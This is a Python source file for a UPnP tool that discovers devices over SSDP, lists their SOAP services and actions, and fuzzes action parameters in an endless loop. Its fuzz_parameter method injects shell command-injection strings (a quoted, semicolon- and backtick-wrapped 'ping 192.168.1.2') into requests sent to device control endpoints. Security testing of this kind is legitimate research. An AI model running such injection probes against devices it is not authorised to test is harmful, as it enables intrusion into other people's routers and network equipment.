import random
import socket
import requests
import xml.dom.minidom as minidom
import re
import sys


class UPNP(object):
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    def discover(self):
        self.msearch("239.255.255.250", 1900)

        while True:
            try:
                data, (ip, port) = self.sock.recvfrom(1024)

                print("=== {} ===".format(ip))
                print(str(data, "utf-8"))
            except KeyboardInterrupt:
                break

    def msearch(self, ip, port):
        request = (
            b"M-SEARCH * HTTP/1.1\r\n" +
            bytes("HOST: {}:{}\r\n".format(ip, port), "utf-8") +
            b"MAN: \"ssdp:discover\"\r\n" +
            b"MX: 2\r\n" +
            b"ST: upnp:rootdevice\r\n\r\n"
        )

        self.sock.sendto(request, (ip, port))

    def enum(self, ip):
        data = self.enumerate(ip)

        for item in data:
            print("Control: {}".format(item["control"]))
            print("Service: {}".format(item["service"]))
            print("SCPD URL: {}".format(item["scpd_url"]))

            for action in item["actions"]:
                print("    {}".format(action["name"]))

                for args in action["args"]:
                    if args["direction"] == "in":
                        print("\033[31m", end="")
                    else:
                        print("\033[32m", end="")    

                    if args["values"]:
                        print("      - {} ({}, values: {})".format(args["name"], args["type"], ", ".join(args["values"])))
                    else:
                        print("      - {} ({})\033[0m".format(args["name"], args["type"]))

                    print("\033[0m", end="")


    def enumerate(self, ip):
        results = []

        # discover device, get location
        self.msearch(ip, 1900)

        data, (ip, port) = self.sock.recvfrom(1024)
        res = re.findall(b"LOCATION: (.*?)\r\n", data, re.IGNORECASE)
        if not res:
            print("Could not find Location")
            return

        location = str(res[0], "utf-8")
        res = re.findall("(http://.*?:\d*)/", location)
        base_url = res[0]

        # get description
        response = requests.get(location)
        if not response or response.status_code != 200:
            print("Could not get description")
            return

        xml = minidom.parseString(response.text) 

        # get device types, service types and scpd urls 
        control_urls = [control_url.childNodes[0].nodeValue for control_url in xml.getElementsByTagName("controlURL")]
        service_types = [service_type.childNodes[0].nodeValue for service_type in xml.getElementsByTagName("serviceType")]
        scpd_urls = [scpd_url.childNodes[0].nodeValue for scpd_url in xml.getElementsByTagName("SCPDURL")]

        for i in range(len(control_urls)):
            results.append({
                "base_url": base_url,
                "control": control_urls[i],
                "service": service_types[i],
                "scpd_url": scpd_urls[i],
                "actions": []
            })

        for result in results:
            url = "{}{}".format(base_url, result["scpd_url"])
            response = requests.get(url)

            xml = minidom.parseString(response.text)

            state_table = self._load_service_state_table(xml)

            actions = xml.getElementsByTagName("action")
            for action in actions:
                name = action.getElementsByTagName("name")[0].childNodes[0].nodeValue

                result["actions"].append({
                    "name": name,
                    "args": [],
                })

                arguments = action.getElementsByTagName("argument")
                for argument in arguments:
                    direction = argument.getElementsByTagName("direction")[0].childNodes[0].nodeValue
                    name = argument.getElementsByTagName("name")[0].childNodes[0].nodeValue
                    state = argument.getElementsByTagName("relatedStateVariable")[0].childNodes[0].nodeValue

                    result["actions"][-1]["args"].append({
                        "name": name,
                        "direction": direction,
                        "type": state_table[state][0],
                        "values": state_table[state][1]
                    })
        return results

    def fuzz(self, ip, control, service, action):
        data = self.enumerate(ip)

        for item in data:
            if item["control"] == control and item["service"] == service:
                for action_item in item["actions"]:
                    if action_item["name"] == action:
                        while True:
                            self.fuzz_endpoint(item["base_url"], control, service, action_item)

    def fuzz_parameter(self, data, data_type):
        if data:
            value = random.choice(data)

        else:
            if data_type == "ui2":
                value = random.randint(0, 1024)
            elif data_type == "ui4":
                value = random.randint(0, 65535)
            elif data_type == "string":
                value = "A"*random.randint(0,4)
            elif data_type == "boolean":
                value = random.choice([0, 1])

        payload = "ping 192.168.1.2"
        if random.randint(0, 1):
            if random.randint(0, 1):
                payload = "`{}`".format(payload)

            seperator = random.choice(["'", "\""])
            connector = random.choice([";"])

            value = "{}{}{}{}{}".format(seperator, connector, payload, connector, seperator) 

        return value

    def fuzz_endpoint(self, base_url, control, service, action):
        url = "{}{}".format(base_url, control)
        soap_action = "{}#{}".format(service, action["name"])

        headers = {
            "SOAPAction": soap_action,
            "Content-Type": "text/xml",
        }

        arguments = ""
        for arg in action["args"]:
            if arg["direction"] == "in":
                value = self.fuzz_parameter(arg["values"], arg["type"])

                arguments += "<{0}>{1}</{0}>".format(arg["name"], value)

        xml = (
            "<?xml version=\"1.0\"?>" +
            "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">" +
            "<SOAP-ENV:Body>" +
        	"<m:SetConnectionType xmlns:m=\"{}\">".format(service) +
            "{}".format(arguments) +
	        "</m:SetConnectionType>" +
            "</SOAP-ENV:Body>"+
            "</SOAP-ENV:Envelope>" 
        )

        print(url)
        print(headers)
        print(xml)
        response = requests.post(url=url, data=xml, headers=headers, timeout=20.0)
        print(response.text)

    def _load_service_state_table(self, xml):
        variables = {}

        state_variables = xml.getElementsByTagName("stateVariable")
        for state_variable in state_variables:
            name = state_variable.getElementsByTagName("name")[0].childNodes[0].nodeValue
            data_type = state_variable.getElementsByTagName("dataType")[0].childNodes[0].nodeValue    
            values = [value.childNodes[0].nodeValue for value in state_variable.getElementsByTagName("allowedValue")]

            variables[name] = (data_type, values)

        return variables
